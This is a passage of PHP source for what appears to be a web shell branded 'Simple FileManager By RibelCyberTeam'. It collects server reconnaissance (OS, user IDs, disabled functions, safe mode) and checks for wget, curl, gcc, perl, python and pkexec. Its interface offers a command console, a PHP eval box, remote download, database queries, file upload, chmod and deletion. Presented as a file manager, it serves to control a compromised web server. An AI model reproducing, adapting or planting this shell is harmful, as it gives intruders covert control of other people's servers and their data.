elseif($sortOrder==='name_desc'){usort($files,function($a,$b){if($a['isdir']!==$b['isdir'])return $a['isdir']?-1:1;return strcasecmp($b['name'],$a['name']);});}
elseif($sortOrder==='size_asc'){usort($files,function($a,$b){if($a['isdir']!==$b['isdir'])return $a['isdir']?-1:1;$sa=is_numeric($a['size'])?$a['size']:0;$sb=is_numeric($b['size'])?$b['size']:0;if($sa!==$sb)return $sa-$sb;return strcasecmp($a['name'],$b['name']);});}
elseif($sortOrder==='size_desc'){usort($files,function($a,$b){if($a['isdir']!==$b['isdir'])return $a['isdir']?-1:1;$sa=is_numeric($a['size'])?$a['size']:0;$sb=is_numeric($b['size'])?$b['size']:0;if($sa!==$sb)return $sb-$sa;return strcasecmp($a['name'],$b['name']);});}

// --- System info ---
$sysInfo = [
    'Hostname' => gethostname(),
    'Uname' => php_uname(),
    'Server' => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A',
    'PHP Version' => phpversion(),
    'SAPI' => php_sapi_name(),
    'User' => function_exists('posix_getpwuid') ? posix_getpwuid(posix_geteuid())['name'] : get_current_user(),
    'UID/GID' => posix_geteuid() . '/' . posix_getegid(),
    'CWD' => $CWD,
    'Document Root' => $_SERVER['DOCUMENT_ROOT'] ?? 'N/A',
    'Client IP' => $_SERVER['REMOTE_ADDR'] ?? 'N/A',
    'disable_functions' => ini_get('disable_functions'),
    'open_basedir' => ini_get('open_basedir') ?: 'none',
    'Loaded Extensions' => implode(', ', get_loaded_extensions()),
];
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Simple FileManager By RibelCyberTeam</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
html,body{min-height:100%;color:#e8e8e8;font:13px/1.45 Arial,Helvetica,sans-serif}
body{
  background:
    radial-gradient(1200px 600px at 10% -10%, rgba(46,125,50,.35), transparent 55%),
    radial-gradient(900px 500px at 100% 0%, rgba(21,101,192,.28), transparent 50%),
    radial-gradient(800px 400px at 50% 100%, rgba(0,150,136,.18), transparent 50%),
    #0b0d10;
  background-attachment:fixed;
}
a{color:#7dd3fc;text-decoration:none}
a:hover{text-decoration:underline;color:#bae6fd}
.wrap{max-width:1200px;margin:0 auto;padding:18px 16px 40px}

/* Glass helpers */
.glass{
  background:rgba(255,255,255,.06);
  border:1px solid rgba(255,255,255,.12);
  box-shadow:0 8px 32px rgba(0,0,0,.35), inset 0 1px 0 rgba(255,255,255,.08);
  backdrop-filter:blur(16px) saturate(140%);
  -webkit-backdrop-filter:blur(16px) saturate(140%);
  border-radius:14px;
}
.glass-soft{
  background:rgba(255,255,255,.04);
  border:1px solid rgba(255,255,255,.10);
  box-shadow:0 4px 18px rgba(0,0,0,.25), inset 0 1px 0 rgba(255,255,255,.06);
  backdrop-filter:blur(12px) saturate(130%);
  -webkit-backdrop-filter:blur(12px) saturate(130%);
  border-radius:12px;
}

/* Header */
.header{text-align:center;padding:22px 16px 14px;margin-bottom:14px}
.header h1{font-size:26px;font-weight:600;color:#fff;letter-spacing:.2px;text-shadow:0 2px 16px rgba(46,125,50,.35)}
.header .by{color:#81c784;font-size:12px;margin-top:2px}

/* Sysinfo block */
.sys{padding:14px 16px;margin-bottom:14px;font-size:12.5px;line-height:1.75;color:#d7d7d7}
.sys .k{color:#9aa3ad}
.sys .on{color:#69f0ae;font-weight:700;text-shadow:0 0 10px rgba(105,240,174,.35)}
.sys .off{color:#ff5252;font-weight:700}
.sys .val{color:#f1f1f1}
.sys .line{display:block}

/* Nav bar Back / Home */
.navrow{display:flex;flex-wrap:wrap;gap:8px;align-items:center;margin:0 0 12px;padding:10px 12px}
.navrow .nav-btns{display:flex;flex-wrap:wrap;gap:8px;align-items:center}
.nav-btn{
  display:inline-flex;align-items:center;gap:6px;
  padding:8px 14px;border-radius:10px;font:600 12px Arial,sans-serif;
  color:#fff;text-decoration:none;cursor:pointer;border:1px solid rgba(255,255,255,.14);
  background:linear-gradient(180deg, rgba(255,255,255,.12), rgba(255,255,255,.05));
  backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);
  box-shadow:0 4px 14px rgba(0,0,0,.25), inset 0 1px 0 rgba(255,255,255,.12);
  transition:transform .12s ease, filter .12s ease, background .12s ease;
}
.nav-btn:hover{filter:brightness(1.1);text-decoration:none;color:#fff;transform:translateY(-1px)}
.nav-btn:active{transform:translateY(0)}
.nav-btn.disabled{opacity:.4;pointer-events:none}
.nav-btn.back{background:linear-gradient(180deg, rgba(33,150,243,.35), rgba(21,101,192,.28));border-color:rgba(100,181,246,.35)}
.nav-btn.home{background:linear-gradient(180deg, rgba(76,175,80,.4), rgba(46,125,50,.32));border-color:rgba(129,199,132,.4)}
.nav-btn .arrow{font-size:14px;font-weight:700;line-height:1}
.nav-meta{margin-left:auto;color:#9aa3ad;font-size:11px;text-align:right}
.nav-meta code{color:#c8e6c9;background:rgba(0,0,0,.25);padding:2px 6px;border-radius:6px;font-size:10.5px}

/* Path */
.pathbar{margin:0 0 14px;padding:12px 14px;font-size:13px;word-break:break-all;display:flex;flex-wrap:wrap;align-items:center;gap:6px}
.pathbar .lbl{color:#9aa3ad;margin-right:4px;font-weight:600}
.pathbar a{margin:0 2px;color:#81d4fa}
.pathbar .cur{color:#fff;font-weight:600}
.pathbar .sep{color:#556}

/* Cards / panels */
.panel{padding:14px;margin-bottom:16px}
.panel h3{font-size:13px;color:#fff;margin-bottom:10px;font-weight:600}
.panel h3 span{color:#81c784;font-weight:400;font-size:12px}

/* Upload */
.upload-row{display:flex;flex-wrap:wrap;gap:8px;align-items:center}
.upload-row input[type=file]{flex:1;min-width:200px;background:rgba(0,0,0,.28);border:1px solid rgba(255,255,255,.14);color:#ccc;padding:8px;font-size:12px;border-radius:8px}
.btn{display:inline-block;border:1px solid rgba(255,255,255,.12);cursor:pointer;padding:9px 16px;font:600 12px Arial,sans-serif;color:#fff;background:rgba(255,255,255,.08);text-decoration:none;text-align:center;letter-spacing:.3px;border-radius:10px;backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);box-shadow:inset 0 1px 0 rgba(255,255,255,.08)}
.btn:hover{filter:brightness(1.1);text-decoration:none;color:#fff}
.btn-green{background:linear-gradient(180deg,#43a047,#2e7d32);border-color:rgba(129,199,132,.35);width:100%;margin-top:8px;padding:11px}
.btn-green:hover{filter:brightness(1.08)}
.btn-dark{background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.14);color:#eee}
.btn-dark:hover{background:rgba(255,255,255,.12);color:#fff}
.btn-sm{padding:5px 10px;font-size:11px;font-weight:600}
.btn-cyan{background:#00838f}
.btn-yellow{background:#f9a825;color:#111}
.btn-blue{background:#1565c0}
.btn-red{background:#c62828}
.btn-purple{background:#6a1b9a}
.btn-orange{background:#ef6c00}

/* Toolbar */
.tools{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:14px;padding:10px;border-radius:12px}
.tools .btn{border-radius:9px}

/* Msg */
.msg{background:rgba(46,125,50,.18);border:1px solid rgba(105,240,174,.28);color:#c8f7c5;padding:10px 12px;margin-bottom:14px;font:12px/1.5 Consolas,"Courier New",monospace;white-space:pre-wrap;word-break:break-word;display:none;border-radius:12px;backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px)}
.msg.show{display:block}
.msg.err{background:rgba(198,40,40,.2);border-color:rgba(255,82,82,.35);color:#ffcdd2}
.clip{background:rgba(21,101,192,.18);border:1px solid rgba(100,181,246,.3);color:#bbdefb;padding:8px 12px;margin-bottom:14px;display:none;align-items:center;gap:10px;flex-wrap:wrap;font-size:12px;border-radius:12px;backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px)}
.clip.show{display:flex}

/* Filter */
.filterbar{display:flex;flex-wrap:wrap;gap:8px;align-items:center;margin-bottom:10px}
.filterbar input[type=text]{background:rgba(0,0,0,.28);border:1px solid rgba(255,255,255,.14);color:#eee;padding:7px 10px;font:12px Arial;min-width:180px;outline:none;border-radius:8px}
.filterbar input:focus{border-color:rgba(129,199,132,.55);box-shadow:0 0 0 3px rgba(46,125,50,.15)}
.filterbar .meta{color:#777;font-size:12px;margin-left:auto}

/* Table */
.table-wrap{overflow:auto;border:1px solid rgba(255,255,255,.1);border-radius:12px;background:rgba(0,0,0,.18)}
table.list{width:100%;border-collapse:collapse;font-size:12.5px;background:transparent}
table.list thead th{background:rgba(255,255,255,.06);color:#cfd8dc;text-align:left;padding:9px 10px;border-bottom:1px solid rgba(255,255,255,.1);font-weight:600;white-space:nowrap;position:sticky;top:0;z-index:1;backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px)}
table.list thead th.sortable{cursor:pointer;user-select:none}
table.list thead th.sortable:hover{color:#fff}
table.list tbody td{padding:8px 10px;border-bottom:1px solid rgba(255,255,255,.05);vertical-align:middle;color:#e2e2e2}
table.list tbody tr:hover{background:rgba(255,255,255,.06)}
table.list tbody tr.selected{background:rgba(46,125,50,.22)}
table.list tbody tr:nth-child(even){background:rgba(255,255,255,.02)}
table.list tbody tr:nth-child(even):hover{background:rgba(255,255,255,.07)}
table.list tbody tr.selected:nth-child(even){background:rgba(46,125,50,.22)}
table.list a.fname{color:#e8e8e8;font-weight:500}
table.list a.fname:hover{color:#4dabf7}
table.list .dir a.fname{color:#81c784}
.sz{color:#aaa;white-space:nowrap}
.mtime{color:#999;white-space:nowrap;font-size:11.5px}
.owner{color:#888;white-space:nowrap}
.perm{font-family:Consolas,"Courier New",monospace;color:#bdbdbd;white-space:nowrap}
.acts{white-space:nowrap}
.acts .ico{
  display:inline-flex;align-items:center;justify-content:center;
  width:26px;height:24px;margin-right:3px;border:0;border-radius:3px;
  color:#fff;font-size:12px;cursor:pointer;text-decoration:none;vertical-align:middle;
  padding:0;line-height:1
}
.acts .ico:hover{filter:brightness(1.15);text-decoration:none;color:#fff;transform:translateY(-1px)}
.ico-view{background:#00acc1}
.ico-edit{background:#f9a825;color:#111}
.ico-lock{background:#1e88e5}
.ico-del{background:#e53935}
.ico-dl{background:#43a047}
.ico-open{background:#7b1fa2}
.chk{width:18px}
input[type=checkbox]{accent-color:#2e7d32;cursor:pointer}

/* File type glyph */
.glyph{display:inline-block;width:16px;text-align:center;margin-right:6px;opacity:.9}
.glyph-dir{color:#ffc107}
.glyph-php{color:#7e57c2}
.glyph-img{color:#29b6f6}
.glyph-zip{color:#ff7043}
.glyph-file{color:#9e9e9e}

/* Footer */
.footer{text-align:center;margin-top:22px;color:#555;font-size:12px}
.footer a{color:#2e7d32;font-weight:600}

/* Status line */
.stats{display:flex;flex-wrap:wrap;gap:12px;justify-content:space-between;color:#666;font-size:11.5px;margin-top:10px;padding:0 2px}

/* Forms / inputs inside panels */
label.lbl{display:block;color:#999;font-size:11px;margin:8px 0 4px}
input[type=text],input[type=password],input[type=number],select,textarea{
  width:100%;background:rgba(0,0,0,.28);border:1px solid rgba(255,255,255,.14);color:#eee;padding:8px 10px;
  font:12.5px Arial,sans-serif;outline:none;margin-bottom:6px;border-radius:8px
}
textarea{font-family:Consolas,"Courier New",monospace;min-height:120px;resize:vertical}
input:focus,select:focus,textarea:focus{border-color:rgba(129,199,132,.55);box-shadow:0 0 0 3px rgba(46,125,50,.15)}
.grid2{display:grid;grid-template-columns:1fr 1fr;gap:8px}
.hint{color:#666;font-size:11px;margin-bottom:6px}
.row-btns{display:flex;gap:6px;flex-wrap:wrap;margin-top:8px}

/* Modal */
.modal-bg{display:none;position:fixed;inset:0;background:rgba(5,8,12,.62);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);z-index:1000;align-items:center;justify-content:center;padding:14px}
.modal-bg.show{display:flex}
.modal{background:rgba(22,26,32,.72);border:1px solid rgba(255,255,255,.14);width:100%;max-width:640px;max-height:90vh;display:flex;flex-direction:column;box-shadow:0 20px 60px rgba(0,0,0,.55);border-radius:16px;backdrop-filter:blur(18px) saturate(140%);-webkit-backdrop-filter:blur(18px) saturate(140%);overflow:hidden}
.modal.wide{max-width:860px}
.modal .mhd{background:rgba(255,255,255,.05);border-bottom:1px solid rgba(255,255,255,.1);padding:12px 14px;display:flex;justify-content:space-between;align-items:center}
.modal .mhd h2{font-size:14px;color:#fff;font-weight:600}
.modal .mhd .x{background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.12);color:#ccc;width:28px;height:28px;cursor:pointer;font-size:14px;line-height:1;border-radius:8px}
.modal .mhd .x:hover{background:#c62828;color:#fff;border-color:#c62828}
.modal .mbd{padding:14px;overflow:auto;flex:1}
.modal .mft{padding:10px 14px;border-top:1px solid rgba(255,255,255,.1);display:flex;justify-content:flex-end;gap:6px;background:rgba(0,0,0,.18)}
pre.out{background:rgba(0,0,0,.35);border:1px solid rgba(255,255,255,.1);padding:10px;max-height:420px;overflow:auto;font:12px Consolas,"Courier New",monospace;white-space:pre-wrap;word-break:break-all;color:#cfcfcf;border-radius:10px}
.sys-table{width:100%;border-collapse:collapse}
.sys-table td{padding:6px 8px;border-bottom:1px solid #222;vertical-align:top;font-size:12px}
.sys-table td:first-child{color:#888;width:140px;white-space:nowrap}
.sys-table td:last-child{font-family:Consolas,"Courier New",monospace;color:#ddd;word-break:break-all;font-size:11px}

.tabs{display:flex;flex-wrap:wrap;gap:4px;margin-bottom:12px;border-bottom:1px solid #2a2a2a;padding-bottom:8px}
.tabs a{padding:6px 12px;color:#aaa;background:#1a1a1a;border:1px solid #2a2a2a;font-size:12px;font-weight:600}
.tabs a:hover,.tabs a.on{background:#2e7d32;color:#fff;border-color:#2e7d32;text-decoration:none}

.chkline{display:flex;align-items:center;gap:6px;margin:6px 0;font-size:12px;color:#ccc}
.chkline input{width:auto}

@media(max-width:700px){
  .header h1{font-size:18px}
  .hide-sm{display:none}
  .grid2{grid-template-columns:1fr}
}
</style>
</head>
<body>
<div class="wrap">

<div class="header glass">
  <h1>Simple FileManager By RibelCyberTeam</h1>
</div>

<?php
// Feature detection linelike Ribel
function ribel_on($ok){ return $ok ? '<span class="on">ON</span>' : '<span class="off">OFF</span>'; }
function ribel_which($bins){
    foreach ((array)$bins as $b) {
        if (@is_file($b) && @is_executable($b)) return true;
    }
    // PATH scan without shell_exec
    $path = getenv('PATH') ?: '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin';
    foreach (explode(':', $path) as $dir) {
        foreach ((array)$bins as $b) {
            $name = basename($b);
            $cand = rtrim($dir, '/').'/'.$name;
            if (@is_file($cand) && @is_executable($cand)) return true;
        }
    }
    return false;
}
$ribelFeats = [
    'MySQL'   => function_exists('mysqli_connect') || extension_loaded('mysqli') || extension_loaded('mysql') || extension_loaded('pdo_mysql'),
    'Perl'    => ribel_which(['/usr/bin/perl','/bin/perl']),
    'WGET'    => ribel_which(['/usr/bin/wget','/bin/wget']),
    'CURL'    => function_exists('curl_init') || ribel_which(['/usr/bin/curl']),
    'Python'  => ribel_which(['/usr/bin/python3','/usr/bin/python','/bin/python3']),
    'Pkexec'  => ribel_which(['/usr/bin/pkexec']),
    'GCC'     => ribel_which(['/usr/bin/gcc','/bin/gcc']),
];
$uname = function_exists('php_uname') ? php_uname() : PHP_OS;
$uid = function_exists('posix_geteuid') ? @posix_geteuid() : getmyuid();
$gid = function_exists('posix_getegid') ? @posix_getegid() : getmygid();
$uinfo = function_exists('posix_getpwuid') && $uid !== false ? @posix_getpwuid($uid) : false;
$ginfo = function_exists('posix_getgrgid') && $gid !== false ? @posix_getgrgid($gid) : false;
$userName = is_array($uinfo) ? $uinfo['name'] : (function_exists('get_current_user') ? get_current_user() : '?');
$groupName = is_array($ginfo) ? $ginfo['name'] : '?';
$safeMode = ini_get('safe_mode') ? 'ON' : 'OFF';
$disabled = ini_get('disable_functions');
$disabled = $disabled === '' || $disabled === false ? 'NONE' : $disabled;
if ($disabled !== 'NONE' && strlen($disabled) > 180) {
    $disabled = substr($disabled, 0, 180) . '...';
}
$serverSoft = $_SERVER['SERVER_SOFTWARE'] ?? 'N/A';
$serverAddr = $_SERVER['SERVER_ADDR'] ?? ($_SERVER['LOCAL_ADDR'] ?? 'N/A');
$httpHost = $_SERVER['HTTP_HOST'] ?? gethostname();
?>

<div class="sys glass">
  <span class="line"><span class="k">System:</span> <span class="val"><?= htmlspecialchars($uname) ?></span></span>
  <span class="line"><span class="k">User:</span> <span class="val"><?= htmlspecialchars($userName) ?> (<?= htmlspecialchars((string)$uid) ?>) | Group: <?= htmlspecialchars($groupName) ?> (<?= htmlspecialchars((string)$gid) ?>)</span></span>
  <span class="line"><span class="k">PHP Version:</span> <span class="val"><?= htmlspecialchars(PHP_VERSION) ?> | OS: <?= htmlspecialchars(PHP_OS) ?></span></span>
  <span class="line"><span class="k">Software:</span> <span class="val"><?= htmlspecialchars($serverSoft) ?></span></span>
  <span class="line"><span class="k">Domain:</span> <span class="val"><?= htmlspecialchars($httpHost) ?></span></span>
  <span class="line"><span class="k">Server IP:</span> <span class="val"><?= htmlspecialchars($serverAddr) ?></span></span>
  <span class="line"><span class="k">Safe Mode:</span> <span class="val"><?= $safeMode === 'ON' ? '<span class="on">ON</span>' : '<span class="off">OFF</span>' ?></span></span>
  <span class="line">
    <?php
      $parts = [];
      foreach ($ribelFeats as $name => $ok) $parts[] = $name.': '.ribel_on($ok);
      echo implode(' | ', $parts);
    ?>
  </span>
  <span class="line"><span class="k">Disable Function:</span> <span class="val" style="word-break:break-all"><?= htmlspecialchars($disabled) ?></span></span>
</div>

<?php
  $isAtHome = (realpath($CWD) === realpath($HOME_PATH));
  $canBack = ($CWD && $CWD !== '/');
  $backTarget = $canBack ? $HOME_PARENT : $HOME_PATH;
?>
<div class="navrow glass">
  <div class="nav-btns">
    <?php if ($canBack): ?>
      <a class="nav-btn back" href="?d=<?= urlencode($backTarget) ?>" title="Kembali ke folder parent">
        <span class="arrow">&larr;</span> Back
      </a>
    <?php else: ?>
      <span class="nav-btn back disabled" title="Sudah di root"><span class="arrow">&larr;</span> Back</span>
    <?php endif; ?>
    <a class="nav-btn home<?= $isAtHome ? ' disabled' : '' ?>" href="?d=<?= urlencode($HOME_PATH) ?>" title="Kembali ke path awal shell">
      Home
    </a>
    <a class="nav-btn" href="?d=/" title="Ke root filesystem">/ Root</a>
    <button type="button" class="nav-btn" onclick="if(window.history.length>1){history.back();}else{location.href='?d=<?= urlencode($backTarget) ?>';}" title="Browser history back">
      <span class="arrow">&larr;</span> History
    </button>
  </div>
  <div class="nav-meta hide-sm">
    Home: <code><?= htmlspecialchars($HOME_PATH) ?></code>
  </div>
</div>

<div class="pathbar glass-soft">
  <span class="lbl">PATH:</span>
  <a href="?d=/">Root</a>
<?php
  $parts = array_values(array_filter(explode('/', trim($CWD, '/')), 'strlen'));
  $build = '';
  foreach ($parts as $i => $part) {
      $build .= '/' . $part;
      echo ' <span class="sep">/</span> ';
      if ($i === count($parts) - 1) {
          echo '<span class="cur">' . htmlspecialchars($part) . '</span>';
      } else {
          echo '<a href="?d=' . urlencode($build) . '">' . htmlspecialchars($part) . '</a>';
      }
  }
?>
</div>

<?php if ($outputHTML): ?>
<div class="msg show" id="result-box"><?= $outputHTML ?></div>
<?php endif; ?>

<?php if ($outputFile): ?>
<div class="panel glass">
  <h3>Viewing <span><?= htmlspecialchars($outputFile['path']) ?></span></h3>
  <div class="hint">Size: <?= number_format($outputFile['size']) ?> · Perms: <?= htmlspecialchars($outputFile['perms']) ?> · Modified: <?= htmlspecialchars($outputFile['mtime']) ?></div>
  <pre class="out"><?= htmlspecialchars($outputFile['content']) ?></pre>
</div>
<?php endif; ?>

<?php if (isset($_SESSION['shell_clipboard']) && !empty($_SESSION['shell_clipboard']['items'])): ?>
<div class="clip show" id="clipboard-bar">
  <span>Clipboard: <b><?= count($_SESSION['shell_clipboard']['items']) ?></b> item(s)
  <b><?= strtoupper($_SESSION['shell_clipboard']['action']) ?></b>
  from <code><?= htmlspecialchars($_SESSION['shell_clipboard']['source_dir']) ?></code></span>
  <button type="button" class="btn btn-sm btn-green" style="width:auto;margin:0" onclick="pasteItems()">Paste Here</button>
  <button type="button" class="btn btn-sm btn-dark" onclick="clearClipboard()">Clear</button>
</div>
<?php endif; ?>

<!-- Upload -->
<div class="panel glass">
  <form method="post" enctype="multipart/form-data">
    <input type="hidden" name="token" value="<?= $TOKEN ?>">
    <div class="upload-row">
      <input type="file" name="upload_file">
    </div>
    <button type="submit" class="btn btn-green">Upload</button>
  </form>
</div>

<!-- Quick tools -->
<div class="tools glass-soft">
  <a class="btn btn-sm btn-dark" href="#" onclick="openModal('cmd');return false;">Console</a>
  <a class="btn btn-sm btn-dark" href="#" onclick="openModal('eval');return false;">PHP Eval</a>
  <a class="btn btn-sm btn-dark" href="#" onclick="openModal('edit');return false;">New/Edit</a>
  <a class="btn btn-sm btn-dark" href="#" onclick="openModal('mkdir');return false;">New Folder</a>
  <a class="btn btn-sm btn-dark" href="#" onclick="openModal('wget');return false;">Wget</a>
  <a class="btn btn-sm btn-dark" href="#" onclick="openModal('db');return false;">DB Query</a>
  <a class="btn btn-sm btn-dark" href="#" onclick="openModal('tools');return false;">Tools</a>
  <a class="btn btn-sm btn-dark" href="#" onclick="openModal('sysinfo');return false;">SysInfo</a>
  <a class="btn btn-sm btn-cyan" href="#" onclick="cutSelected();return false;">Cut</a>
  <a class="btn btn-sm btn-yellow" href="#" onclick="copySelected();return false;">Copy</a>
  <a class="btn btn-sm btn-blue" href="#" onclick="pasteItems();return false;">Paste</a>
  <a class="btn btn-sm btn-orange" href="#" onclick="bulkZip();return false;">Zip</a>
  <a class="btn btn-sm btn-red" href="#" onclick="bulkDelete();return false;">Delete</a>
</div>

<div class="panel glass" style="padding-top:10px">
  <h3>List Direktori dan File</h3>

  <div class="filterbar">
    <input type="text" id="file-filter" placeholder="Filter file..." oninput="filterFiles()">
    <button type="button" class="btn btn-sm btn-dark" onclick="selectAll()">All</button>
    <button type="button" class="btn btn-sm btn-dark" onclick="invertSelection()">Invert</button>
    <button type="button" class="btn btn-sm btn-dark" onclick="clearSelection()">None</button>
    <span class="meta" id="selected-count">0 selected</span>
  </div>

<?php
$fileCount = 0; $dirCount = 0;
foreach ($files as $f) { if ($f['isdir']) $dirCount++; else $fileCount++; }
$sortInd = ['name'=>'','size'=>'','mtime'=>''];
if (strpos($sortOrder,'name_')===0) $sortInd['name'] = $sortOrder==='name_asc'?' ▲':' ▼';
if (strpos($sortOrder,'size_')===0) $sortInd['size'] = $sortOrder==='size_asc'?' ▲':' ▼';
if (strpos($sortOrder,'mtime_')===0) $sortInd['mtime'] = $sortOrder==='mtime_asc'?' ▲':' ▼';

function ribel_glyph($f){
    if ($f['isdir']) return '<span class="glyph glyph-dir">📁</span>';
    $ext = strtolower(pathinfo($f['name'], PATHINFO_EXTENSION));
    if (in_array($ext, ['php','phtml','phar'])) return '<span class="glyph glyph-php">🧩</span>';
    if (in_array($ext, ['jpg','jpeg','png','gif','svg','webp','ico'])) return '<span class="glyph glyph-img">🖼</span>';
    if (in_array($ext, ['zip','tar','gz','tgz','rar','7z','bz2'])) return '<span class="glyph glyph-zip">📦</span>';
    return '<span class="glyph glyph-file">📄</span>';
}
function ribel_size($f){
    if ($f['isdir']) return '[DIR]';
    $s=(int)$f['size'];
    if ($s < 1024) return $s.' bytes';
    if ($s < 1048576) return number_format($s/1024, 2).' KB';
    if ($s < 1073741824) return number_format($s/1048576, 2).' MB';
    return number_format($s/1073741824, 2).' GB';
}
// Use text icons without emoji that break - RGB style like screenshot uses icon fonts
// We'll use pure CSS/unicode safer set: 👁 ✎ 🔒 🗑 viewed as SVG
function svg_eye(){return '<svg width="13" height="13" viewBox="0 0 24 24" fill="currentColor"><path d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 12a5 5 0 110-10 5 5 0 010 10zm0-8a3 3 0 100 6 3 3 0 000-6z"/></svg>';}
function svg_edit(){return '<svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04a1 1 0 000-1.41l-2.34-2.34a1 1 0 00-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/></svg>';}
function svg_lock(){return '<svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M18 8h-1V6a5 5 0 00-10 0v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6a3 3 0 016 0v2H9V6zm3 11a2 2 0 110-4 2 2 0 010 4z"/></svg>';}
function svg_trash(){return '<svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M6 19a2 2 0 002 2h8a2 2 0 002-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/></svg>';}
function svg_dl(){return '<svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>';}
function svg_folder(){return '<svg width="13" height="13" viewBox="0 0 24 24" fill="#ffc107"><path d="M10 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"/></svg>';}
function svg_file(){return '<svg width="12" height="13" viewBox="0 0 24 24" fill="#9e9e9e"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8l-6-6zm4 18H6V4h7v5h5v11z"/></svg>';}
function svg_php(){return '<svg width="12" height="13" viewBox="0 0 24 24" fill="#7e57c2"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8l-6-6zm-1 9.5h-1.2l-.5 2.3H10l.5-2.3H9.2l.2-1h1.3l.3-1.3h-1.3l.2-1h2.5l-.2 1H13.5L13 11.5zm3.8 2.3h-1.1l.5-2.3h-1.3l-.5 2.3h-1.1l1.2-5.3h3.5l-1.2 5.3zM14 9h5v11H6V4h7v5z"/></svg>';}
?>

  <div class="table-wrap">
    <form id="bulk-form" method="post">
      <input type="hidden" name="token" value="<?= $TOKEN ?>">
      <input type="hidden" name="bulk_action" id="bulk-action" value="">
      <table class="list">
        <thead>
          <tr>
            <th class="chk"><input type="checkbox" onclick="toggleAll(this)" title="Select all"></th>
            <th class="sortable" onclick="sortColumn('name')">File/Folder<?= $sortInd['name'] ?></th>
            <th class="sortable" onclick="sortColumn('size')" style="width:100px">File Size<?= $sortInd['size'] ?></th>
            <th class="sortable hide-sm" onclick="sortColumn('mtime')" style="width:160px">Modify<?= $sortInd['mtime'] ?></th>
            <th class="hide-sm" style="width:100px">Owner/Group</th>
            <th style="width:80px">Permission</th>
            <th style="width:130px">Action</th>
          </tr>
        </thead>
        <tbody id="file-tbody">
<?php if ($CWD !== '/'): ?>
          <tr class="parent-row">
            <td></td>
            <td colspan="6">
              <a class="fname" href="?d=<?= urlencode(dirname($CWD)) ?>"><?= svg_folder() ?> ..</a>
            </td>
          </tr>
<?php endif; ?>
<?php foreach ($files as $f):
    if ($f['name'] === '.' || $f['name'] === '..') continue;
    $fp = $f['name'];
    $fullItem = $CWD . '/' . $fp;
    $esc = htmlspecialchars($fp, ENT_QUOTES);
    $ownerDisp = htmlspecialchars((string)$f['owner']);
    // try group
    $groupDisp = '';
    if (function_exists('posix_getgrgid') && isset($f['name'])) {
        // owner already string "user" - keep as-is
    }
    $icon = $f['isdir'] ? svg_folder() : (
        in_array(strtolower(pathinfo($fp, PATHINFO_EXTENSION)), ['php','phtml','phar']) ? svg_php() : svg_file()
    );
?>
          <tr data-name="<?= $esc ?>" class="<?= $f['isdir'] ? 'dir' : '' ?>">
            <td class="chk"><input type="checkbox" class="file-check" name="selected[]" value="<?= htmlspecialchars($fp) ?>" onclick="rowCheck(this)"></td>
            <td>
<?php if ($f['isdir']): ?>
              <a class="fname" href="?d=<?= urlencode($fullItem) ?>"><?= $icon ?> <?= htmlspecialchars($fp) ?></a>
<?php else: ?>
              <a class="fname" href="#" onclick="openModal('view','<?= $esc ?>');return false;"><?= $icon ?> <?= htmlspecialchars($fp) ?></a>
<?php endif; ?>
            </td>
            <td class="sz"><?= ribel_size($f) ?></td>
            <td class="mtime hide-sm" title="<?= htmlspecialchars($f['reltime']) ?>"><?= htmlspecialchars($f['mtime']) ?></td>
            <td class="owner hide-sm"><?= $ownerDisp ?></td>
            <td class="perm"><?= htmlspecialchars($f['perms']) ?></td>
            <td class="acts">
<?php if ($f['isdir']): ?>
              <a class="ico ico-open" href="?d=<?= urlencode($fullItem) ?>" title="Open"><?= svg_folder() ?></a>
              <a class="ico ico-lock" href="#" title="Chmod" onclick="openModal('chmod','<?= $esc ?>');return false;"><?= svg_lock() ?></a>
              <a class="ico ico-del" href="?d=<?= urlencode($CWD) ?>&del=<?= urlencode($fp) ?>&token=<?= $TOKEN ?>" title="Delete" onclick="return confirm('Delete folder <?= $esc ?>?')"><?= svg_trash() ?></a>
<?php else: ?>
              <a class="ico ico-view" href="#" title="View" onclick="openModal('view','<?= $esc ?>');return false;"><?= svg_eye() ?></a>
              <a class="ico ico-edit" href="#" title="Edit" onclick="openModal('edit','<?= $esc ?>');return false;"><?= svg_edit() ?></a>
              <a class="ico ico-lock" href="#" title="Chmod" onclick="openModal('chmod','<?= $esc ?>');return false;"><?= svg_lock() ?></a>
              <a class="ico ico-dl" href="?d=<?= urlencode($CWD) ?>&download=<?= urlencode($fp) ?>&token=<?= $TOKEN ?>" title="Download"><?= svg_dl() ?></a>
